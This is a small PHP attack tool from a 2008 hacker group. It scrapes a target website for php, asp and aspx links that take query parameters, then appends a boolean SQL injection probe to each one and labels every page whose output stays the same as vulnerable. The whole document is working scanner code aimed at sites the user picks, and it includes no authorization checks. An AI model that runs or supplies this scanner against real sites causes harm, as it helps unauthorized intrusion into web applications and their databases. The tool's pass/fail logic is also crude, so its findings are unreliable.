
<?php
 
 #Sh3ll.Team 2008-08-28
 #Sql injection scanner by Pr0xY
 
 $http  = '';
 
 if($http == '')
    die("Http is empty!\n\n<b>Powered by Pr0xY</b>\n# Sh3ll.Team [2008-09-02]");
 
 echo "Scan for : <b>$http</b> \n\n";
 
 $http  = (substr($http, -1) != '/') ? $http.'/' : $http;
 $found = getGet();
 
 function getGet()
 {
    global $http;
     
    $getN = array();
    $fenN = array();
                 
    $htm = @file_get_contents($http);
          @preg_match_all('/((\/[a-zA-Z0-9]+\/)|)([a-zA-Z0-9]+\.[a-zA-Z0-9]+\?)([a-zA-Z0-9]+)(\s*\=)([a-zA-Z0-9]+)/im', $htm, $gets);
 
    foreach($gets[0] as $get)
    {
       $get = str_replace($http, '', $get);
   
       if(!in_array($get, $getN))
       {
          @preg_match_all('/(.*)(\?)/', $get, $gn);
           $name = str_replace('?', '', $gn[1][0]);
 
           if(!@in_array($name, $fenN) && @in_array(substr(strrchr($name, "."), 1), array('php', 'asp', 'aspx'))){
              $getN[] = $get;
               $fenN[] = $name;
           }   
       }   
    }
    return $getN;
 }
 
 foreach($found as $get)
 { 
    $address = $http.$get;
    
    $htm1 = @file_get_contents($address);
    $htm2 = @file_get_contents($address.'%20and%20\'a\'%20=%20\'a\'');
     
    if($htm1 == $htm2)
       echo $get." <b><font color=\"#1B9B1B\">SQL injection!</font></b> \n";
    else
       echo $get." <b><font color=\"#D80404\">Failed!</font></b> \n";
     
 }
 
 echo "\n\n<b>Powered by Pr0xY</b>\n";
 
?>

